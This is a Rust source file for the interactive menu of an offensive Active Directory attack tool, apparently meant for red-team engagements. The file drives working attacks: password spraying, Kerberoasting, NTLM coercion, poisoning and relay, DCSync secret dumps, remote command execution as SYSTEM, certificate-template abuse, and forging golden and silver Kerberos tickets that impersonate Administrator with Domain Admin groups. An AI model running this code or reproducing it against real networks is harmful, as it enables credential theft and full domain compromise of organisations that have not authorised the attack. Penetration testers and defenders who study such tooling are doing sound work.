//! Interactive mode: `adhammer` prompts for domain creds, saves session, attack menu.
//! Reuse saved session with `adhammer --old`.

use anyhow::{Context, Result};
use dialoguer::{Confirm, Input, Password, Select};

use crate::session::{self, Session};
use crate::{
    abuse, asktgt, coerce, dcsync, esc1, exec_cmd, gmsa, golden, lsa, netenum, poison, pth, rbcd,
    relay, roast, samr, scan, secretsdump, silver, spray, AbuseArgs, AsktgtArgs, CoerceArgs,
    DcsyncArgs, Esc1Args, ExecArgs, GmsaArgs, GoldenArgs, LsaArgs, NetArgs, PthArgs, RbcdArgs,
    RelayArgs, SamrArgs, SecretsdumpArgs, SilverArgs, SprayArgs,
};

/// Default Domain-Admin group RID set embedded in forged tickets.
const DA_GROUPS: &[u32] = &[513, 512, 520, 518, 519];

enum Action {
    Scan,
    Roast,
    Spray,
    EnumSamr,
    EnumLsa,
    NetSweep,
    Abuse,
    Coerce,
    Rbcd,
    Dcsync,
    Capture,
    Poison,
    Relay,
    Exec,
    Secretsdump,
    Gmsa,
    Esc1,
    Asktgt,
    Golden,
    Silver,
    Pth,
    ShowRoadmap,
    Exit,
}

const MENU: &[(&str, Action)] = &[
    ("Scan — passive audit (33 checks + graph)", Action::Scan),
    ("Roast — Kerberoast + AS-REP", Action::Roast),
    ("Spray — password spray", Action::Spray),
    ("Enum SAMR — list domain users", Action::EnumSamr),
    ("Enum LSA — name to SID", Action::EnumLsa),
    ("Net — network sweep", Action::NetSweep),
    ("Abuse — LDAP write (SPN / keycred / RBCD …)", Action::Abuse),
    ("Coerce — PetitPotam / PrinterBug", Action::Coerce),
    ("RBCD — impersonation chain", Action::Rbcd),
    ("DCSync — replicate secrets", Action::Dcsync),
    ("Capture — NTLM listener", Action::Capture),
    ("Poison — LLMNR / NBT-NS", Action::Poison),
    ("Relay — NTLM → LDAP shadow cred", Action::Relay),
    (
        "Exec — SVCCTL command as LocalSystem (psexec)",
        Action::Exec,
    ),
    (
        "Secretsdump — local SAM hashes (reg save + C$)",
        Action::Secretsdump,
    ),
    ("gMSA — read managed password → NT hash", Action::Gmsa),
    ("ESC1 — AD CS cert enroll (spoofed UPN SAN)", Action::Esc1),
    ("AskTGT — password → Kerberos ccache", Action::Asktgt),
    ("Golden — forge a TGT (krbtgt key)", Action::Golden),
    (
        "Silver — forge a service ticket (service key)",
        Action::Silver,
    ),
    (
        "Pass-the-ticket — forge → Kerberos SMB → run as SYSTEM",
        Action::Pth,
    ),
    (
        "Show open vectors (VECTORS.md summary)",
        Action::ShowRoadmap,
    ),
    ("Exit", Action::Exit),
];

pub async fn run(use_old: bool) -> Result<()> {
    let reuse = use_old
        || (session::exists()
            && Confirm::new()
                .with_prompt("Saved session found — reuse it? (No = enter new credentials)")
                .default(true)
                .interact()?);
    let sess = if reuse {
        session::load()?
    } else {
        let s = setup_wizard()?;
        session::save(&s)?;
        s
    };

    loop {
        println!();
        println!("=== ADhammer ===");
        println!(
            "  domain: {}  dc: {}  user: {}",
            sess.domain, sess.dc, sess.username
        );
        println!();

        let labels: Vec<&str> = MENU.iter().map(|(l, _)| *l).collect();
        let idx = Select::new()
            .with_prompt("Choose action")
            .items(&labels)
            .default(0)
            .interact()
            .context("menu cancelled")?;

        match &MENU[idx].1 {
            Action::Exit => break,
            Action::ShowRoadmap => {
                print_roadmap_summary();
                continue;
            }
            action => {
                if let Err(e) = dispatch(action, &sess).await {
                    eprintln!("[-] {e:#}");
                }
            }
        }
    }

    Ok(())
}

fn setup_wizard() -> Result<Session> {
    println!("=== ADhammer setup ===");
    println!("Enter the engagement target (saved for `adhammer --old`).\n");

    // 1. user  2. password | NT hash  3. domain  4. domain-controller IP  5. TLS.
    let username: String = Input::new()
        .with_prompt("User (test account / bind identity)")
        .with_initial_text("administrator")
        .interact_text()
        .context("username prompt")?;

    let auth = Select::new()
        .with_prompt("Authenticate with")
        .items(&["Password", "NT hash (pass-the-hash)"])
        .default(0)
        .interact()
        .context("auth prompt")?;
    let (password, nt_hash) = if auth == 0 {
        (Password::new().with_prompt("Password").interact()?, None)
    } else {
        let h: String = Input::new()
            .with_prompt("NT hash (32 hex)")
            .validate_with(|s: &String| match s.trim().len() {
                32 => Ok(()),
                n => Err(format!("expected 32 hex chars, got {n}")),
            })
            .interact_text()?;
        // A blank password is kept so Kerberos/DCSync actions can report they need one.
        (String::new(), Some(h.trim().to_string()))
    };

    let domain: String = Input::new()
        .with_prompt("Domain (DNS, e.g. corp.local)")
        .with_initial_text("corp.local")
        .interact_text()
        .context("domain prompt")?;

    let dc: String = Input::new()
        .with_prompt("Domain controller IP (or hostname)")
        .interact_text()
        .context("dc prompt")?;

    let insecure = Confirm::new()
        .with_prompt("Skip LDAPS certificate verification (lab DC)?")
        .default(true)
        .interact()
        .context("insecure prompt")?;

    Ok(Session {
        domain: domain.trim().to_string(),
        dc: dc.trim().to_string(),
        username: username.trim().to_string(),
        password,
        nt_hash,
        insecure,
    })
}

/// The session's NT hash as `Option<String>` for the pass-the-hash-capable actions.
fn sess_hash(s: &Session) -> Option<String> {
    s.nt_hash.clone()
}

async fn dispatch(action: &Action, s: &Session) -> Result<()> {
    match action {
        Action::Scan => scan(s.scan_args()).await,
        Action::Roast => roast(s.scan_args()).await,
        Action::Spray => {
            let users: String = Input::new()
                .with_prompt("Users (@file or comma-separated)")
                .with_initial_text("@users.txt")
                .interact_text()?;
            let password: String = Password::new()
                .with_prompt("Password to spray")
                .interact()?;
            spray(SprayArgs {
                kdc: s.dc.clone(),
                realm: s.realm(),
                users,
                password,
            })
            .await
        }
        Action::EnumSamr => {
            samr(SamrArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                nt_hash: sess_hash(s),
            })
            .await
        }
        Action::EnumLsa => {
            let name: String = Input::new()
                .with_prompt("Account name to resolve")
                .with_initial_text("Administrator")
                .interact_text()?;
            lsa(LsaArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                nt_hash: sess_hash(s),
                name,
            })
            .await
        }
        Action::NetSweep => {
            let targets: String = Input::new()
                .with_prompt("Targets (CIDR, comma-list, or @file)")
                .with_initial_text("10.0.0.0/24")
                .interact_text()?;
            let deep = Confirm::new()
                .with_prompt(
                    "Deep checks (FTP·SMTP·DNS/AXFR·NFS·rsync·SNMP·RPC/EPM·WinRM·VNC·Redis)?",
                )
                .default(false)
                .interact()?;
            let zone = if deep {
                let z: String = Input::new()
                    .with_prompt("DNS zone for AXFR (blank to skip)")
                    .with_initial_text(&s.domain)
                    .allow_empty(true)
                    .interact_text()?;
                (!z.trim().is_empty()).then(|| z.trim().to_string())
            } else {
                None
            };
            netenum(NetArgs {
                targets,
                concurrency: 256,
                deep,
                zone,
                community: "public,private".to_string(),
            })
            .await
        }
        Action::Abuse => {
            let actions = [
                "add-spn",
                "add-member",
                "set-password",
                "add-keycred",
                "write-rbcd",
                "pkinit",
            ];
            let ai = Select::new()
                .with_prompt("Abuse action")
                .items(&actions)
                .default(0)
                .interact()?;
            let target: String = Input::new()
                .with_prompt("Target sAMAccountName")
                .interact_text()?;
            let value: String = Input::new()
                .with_prompt(
                    "Value (SPN / member / password / trustee SID — empty for pkinit key default)",
                )
                .allow_empty(true)
                .interact_text()?;
            abuse(AbuseArgs {
                url: Some(s.ldap_url()),
                user: Some(s.username.clone()),
                password: Some(s.password.clone()),
                insecure: s.insecure,
                action: actions[ai].to_string(),
                target,
                value,
                realm: Some(s.domain.clone()),
                kdc: Some(s.dc.clone()),
                ldap389: false,
                host: Some(s.dc.clone()),
            })
            .await
        }
        Action::Coerce => {
            let listener: String = Input::new()
                .with_prompt("Listener IP (where DC should auth to)")
                .interact_text()?;
            let pipes = ["lsarpc (PetitPotam)", "efsrpc", "spoolss (PrinterBug)"];
            let pi = Select::new()
                .with_prompt("Coercion vector")
                .items(&pipes)
                .default(0)
                .interact()?;
            let pipe = match pi {
                1 => "efsrpc",
                2 => "spoolss",
                _ => "lsarpc",
            };
            coerce(CoerceArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                listener,
                pipe: pipe.to_string(),
                target: None,
            })
            .await
        }
        Action::Rbcd => {
            let account: String = Input::new()
                .with_prompt("Controlled account (RBCD trustee)")
                .interact_text()?;
            let account_password: String = Password::new()
                .with_prompt("Controlled account password")
                .interact()?;
            let impersonate: String = Input::new()
                .with_prompt("User to impersonate")
                .with_initial_text("Administrator")
                .interact_text()?;
            let target_spn: String = Input::new()
                .with_prompt("Target service SPN (e.g. cifs/dc.corp.local)")
                .interact_text()?;
            rbcd(RbcdArgs {
                kdc: s.dc.clone(),
                realm: s.realm(),
                account,
                account_password,
                impersonate,
                target_spn,
            })
            .await
        }
        Action::Dcsync => {
            let all = Confirm::new()
                .with_prompt("Dump ALL domain accounts (full secretsdump)?")
                .default(false)
                .interact()?;
            let target: String = if all {
                String::new()
            } else {
                Input::new()
                    .with_prompt("Target account (empty = bind-only test)")
                    .allow_empty(true)
                    .interact_text()?
            };
            dcsync(DcsyncArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                target: if target.is_empty() {
                    None
                } else {
                    Some(target)
                },
                all,
            })
            .await
        }
        Action::Capture => {
            let listen: String = Input::new()
                .with_prompt("Listen address")
                .with_initial_text("0.0.0.0:445")
                .interact_text()?;
            smb2_client::server::capture(&listen)
                .await
                .map_err(Into::into)
        }
        Action::Poison => {
            let ip: String = Input::new()
                .with_prompt("Spoof IP (your capture listener)")
                .interact_text()?;
            let spoof_ip: std::net::Ipv4Addr = ip.parse().context("invalid IPv4")?;
            poison::poison(spoof_ip).await
        }
        Action::Relay => {
            let listen: String = Input::new()
                .with_prompt("SMB listen address")
                .with_initial_text("0.0.0.0:445")
                .interact_text()?;
            let target_object: String = Input::new()
                .with_prompt("Target object (sAMAccountName for shadow cred)")
                .interact_text()?;
            relay(RelayArgs {
                listen,
                target_dc: s.dc.clone(),
                realm: s.domain.clone(),
                target_object,
            })
            .await
        }
        Action::Exec => {
            let command: String = Input::new()
                .with_prompt("Command to run as LocalSystem")
                .with_initial_text("whoami")
                .interact_text()?;
            exec_cmd(ExecArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                nt_hash: sess_hash(s),
                command,
            })
            .await
        }
        Action::Secretsdump => {
            secretsdump(SecretsdumpArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                nt_hash: sess_hash(s),
            })
            .await
        }
        Action::Gmsa => {
            let target: String = Input::new()
                .with_prompt("gMSA sAMAccountName (e.g. gmsa_web$)")
                .interact_text()?;
            gmsa(GmsaArgs {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.clone(),
                insecure: s.insecure,
                target,
            })
            .await
        }
        Action::Esc1 => {
            let ca: String = Input::new()
                .with_prompt("CA name (e.g. corp-CA)")
                .interact_text()?;
            let template: String = Input::new()
                .with_prompt("Template")
                .with_initial_text("User")
                .interact_text()?;
            let upn: String = Input::new()
                .with_prompt("UPN to impersonate via SAN")
                .with_initial_text(format!("Administrator@{}", s.domain))
                .interact_text()?;
            let pkinit = Confirm::new()
                .with_prompt("Chain enroll → cert → PKINIT (TGT)?")
                .default(false)
                .interact()?;
            esc1(Esc1Args {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                ca,
                template,
                upn,
                out: std::env::temp_dir()
                    .join("adh_esc1.crt")
                    .to_string_lossy()
                    .into_owned(),
                pkinit,
                kdc: Some(s.dc.clone()),
            })
            .await
        }
        Action::Asktgt => {
            let out: String = Input::new()
                .with_prompt("ccache output path")
                .with_initial_text(format!("{}.ccache", s.username))
                .interact_text()?;
            // Password auth → AES256; hash-only session → overpass-the-hash (RC4).
            let (password, nt_hash) = if s.password.is_empty() {
                (None, sess_hash(s))
            } else {
                (Some(s.password.clone()), None)
            };
            asktgt(AsktgtArgs {
                user: s.username.clone(),
                realm: s.realm(),
                kdc: s.dc.clone(),
                password,
                nt_hash,
                out: Some(out),
            })
            .await
        }
        Action::Golden => {
            let (krbtgt_aes256, domain_sid) =
                fetch_key_and_sid(s, "krbtgt", "krbtgt AES256 key (64 hex)").await?;
            let (user, rid) = prompt_impersonation()?;
            let verify_spn: String = Input::new()
                .with_prompt("Verify against SPN (empty = skip KDC check)")
                .with_initial_text(format!("cifs/{}", s.dc))
                .allow_empty(true)
                .interact_text()?;
            let out: String = Input::new()
                .with_prompt("ccache output path (empty = don't save)")
                .allow_empty(true)
                .interact_text()?;
            golden(GoldenArgs {
                kdc: s.dc.clone(),
                realm: s.realm(),
                krbtgt_aes256,
                domain_sid,
                user,
                rid,
                groups: DA_GROUPS.to_vec(),
                rc4: false,
                out: (!out.is_empty()).then_some(out),
                verify_spn: (!verify_spn.is_empty()).then_some(verify_spn),
            })
            .await
        }
        Action::Silver => {
            let account: String = Input::new()
                .with_prompt("Service/machine account whose key to use (e.g. DC01$)")
                .interact_text()?;
            let (service_aes256, domain_sid) =
                fetch_key_and_sid(s, &account, "service account AES256 key (64 hex)").await?;
            let spn: String = Input::new()
                .with_prompt("Target SPN (e.g. cifs/dc.corp.local)")
                .with_initial_text(format!("cifs/{}", s.dc))
                .interact_text()?;
            let (user, rid) = prompt_impersonation()?;
            let out: String = Input::new()
                .with_prompt("ccache output path (empty = don't save)")
                .allow_empty(true)
                .interact_text()?;
            silver(SilverArgs {
                realm: s.realm(),
                service_aes256,
                spn,
                domain_sid,
                user,
                rid,
                groups: DA_GROUPS.to_vec(),
                rc4: false,
                out: (!out.is_empty()).then_some(out),
            })
            .await
        }
        Action::Pth => {
            let golden_mode = Select::new()
                .with_prompt("Ticket type")
                .items(&[
                    "Golden (krbtgt key, via KDC)",
                    "Silver (service key, no KDC)",
                ])
                .default(0)
                .interact()?
                == 0;
            let (krbtgt_aes256, service_aes256, domain_sid) = if golden_mode {
                let (k, sid) = fetch_key_and_sid(s, "krbtgt", "krbtgt AES256 key (64 hex)").await?;
                (Some(k), None, sid)
            } else {
                let account: String = Input::new()
                    .with_prompt("Service/machine account whose key to use (e.g. DC01$)")
                    .interact_text()?;
                let (k, sid) =
                    fetch_key_and_sid(s, &account, "service account AES256 key (64 hex)").await?;
                (None, Some(k), sid)
            };
            let (user, rid) = prompt_impersonation()?;
            let spn: String = Input::new()
                .with_prompt("Target SPN")
                .with_initial_text(format!("cifs/{}", s.dc))
                .interact_text()?;
            let command: String = Input::new()
                .with_prompt("Command to run (empty = just prove access)")
                .with_initial_text("whoami")
                .allow_empty(true)
                .interact_text()?;
            pth(PthArgs {
                host: s.dc.clone(),
                kdc: Some(s.dc.clone()),
                realm: s.realm(),
                domain_sid,
                krbtgt_aes256,
                service_aes256,
                spn: Some(spn),
                user,
                rid,
                groups: DA_GROUPS.to_vec(),
                rc4: false,
                command: (!command.is_empty()).then_some(command),
            })
            .await
        }
        Action::ShowRoadmap | Action::Exit => Ok(()),
    }
}

/// Auto-fetch `account`'s AES256 key (via DCSync) and the domain SID (via LSAT) using the
/// session's admin credentials — so golden/silver/pth need no manual paste. Falls back to manual
/// prompts if declined or if the account has no AES256 key.
async fn fetch_key_and_sid(
    s: &Session,
    account: &str,
    key_label: &str,
) -> Result<(String, String)> {
    // A hash-only session can't DCSync/LSAT-bind here, so go straight to manual entry.
    let auto = if s.password.is_empty() {
        false
    } else {
        Confirm::new()
            .with_prompt(format!(
                "Auto-fetch {account}'s AES256 key + domain SID via DCSync (uses your session creds)?"
            ))
            .default(true)
            .interact()
            .unwrap_or(false)
    };
    if !auto {
        return Ok((prompt_key(key_label)?, prompt_sid()?));
    }

    // Key via DCSync (DRSUAPI over sealed RPC).
    let mut drs =
        dcerpc::drsuapi::DrsSession::bind(&s.dc, &s.netbios(), &s.username, &s.password).await?;
    let (_rid, _nt, kerb) = drs.dcsync(&s.netbios(), account).await?;
    let key = kerb
        .iter()
        .find(|k| k.etype_name() == "aes256-cts-hmac-sha1-96")
        .map(|k| hex::encode(&k.key))
        .context("account has no AES256 key in supplementalCredentials")?;

    // Domain SID via LSAT (resolve the account, drop the RID).
    let sid = lookup_domain_sid(s, account).await?;
    println!("[*] fetched {account} AES256 key + domain SID {sid}");
    Ok((key, sid))
}

/// Resolve `account` to a SID over LSAT and strip the RID to yield the domain SID string.
async fn lookup_domain_sid(s: &Session, account: &str) -> Result<String> {
    let mut smb = smb2_client::SmbClient::connect(&s.dc).await?;
    smb.login(&s.dc, &s.netbios(), &s.username, &s.password)
        .await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", s.dc)).await?;
    let pipe = smb.open_pipe("lsarpc").await?;
    let mut c = dcerpc::lsat::LsatClient::bind(&mut smb, pipe).await?;
    let policy = c.open_policy().await?;
    let sid = c
        .lookup_name(&policy, account)
        .await?
        .context("LSAT could not resolve the account to a SID")?;
    let mut subs = sid.sub_authorities.clone();
    subs.pop(); // drop the RID → domain SID
    let domain = windows_sddl::Sid {
        revision: sid.revision,
        identifier_authority: sid.identifier_authority,
        sub_authorities: subs,
    };
    Ok(domain.to_string())
}

/// Prompt for a 64-hex AES256 key, trimming/validating length.
fn prompt_key(label: &str) -> Result<String> {
    let k: String = Input::new().with_prompt(label).interact_text()?;
    let k = k.trim().to_string();
    anyhow::ensure!(
        k.len() == 64,
        "expected a 64-hex AES256 key, got {} chars",
        k.len()
    );
    Ok(k)
}

fn prompt_sid() -> Result<String> {
    Ok(Input::<String>::new()
        .with_prompt("Domain SID (S-1-5-21-a-b-c)")
        .interact_text()?
        .trim()
        .to_string())
}

/// Impersonation identity: user + RID (defaults to Administrator / 500).
fn prompt_impersonation() -> Result<(String, u32)> {
    let user: String = Input::new()
        .with_prompt("Impersonate user")
        .with_initial_text("Administrator")
        .interact_text()?;
    let rid: u32 = Input::new()
        .with_prompt("RID")
        .with_initial_text("500")
        .interact_text()?;
    Ok((user, rid))
}

fn print_roadmap_summary() {
    println!();
    println!("=== Open vectors (summary) ===");
    println!("  Audit:  badSuccessor OU-ACL depth, ESC15/EKUwu, ESC5/6/7/10");
    println!("  Attack: pass-the-ticket, pass-the-hash, constrained delegation");
    println!("          GMSA/LAPS read, cert enrollment (ESC1/3 exploit)");
    println!("          ESC8/11 relay, SVCCTL/TSCH remote exec");
    println!("          full-domain DCSync, orchestrated coerce→relay→pkinit");
    println!("  Stack:  LDAP channel binding, GSSAPI bind (feature flag)");
    println!("          SVCCTL · TSCH · RRPM · NETLOGON · WINRM clients");
    println!();
    println!("  Full matrix: VECTORS.md in the repo root (or next to the binary source).");
    println!("  Suggested close order: PTT → ESC5/7 passive → constrained del → GMSA/LAPS → SVCCTL/TSCH → cert enroll");
}
